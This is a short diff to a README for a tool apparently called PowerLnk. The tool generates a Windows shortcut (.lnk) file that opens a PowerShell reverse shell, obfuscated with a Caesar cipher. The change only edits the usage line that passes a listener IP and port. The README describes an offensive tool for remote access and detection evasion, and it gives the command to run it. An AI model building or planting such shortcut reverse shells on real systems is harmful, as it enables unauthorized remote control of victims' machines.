@@ -4,7 +4,7 @@ generates a .Lnk file that executes a reverse shell in powershell using a caesar
 # Useage
 script takes two parameters -ip and -port where ip and port is the device you are listening on
 
-./PowerLnk.ps1 -ip '192.168.1.5' -port 443
+./PowerLnk.ps1 -ip 192.168.1.5 -port 443
 
 # Current detection
 
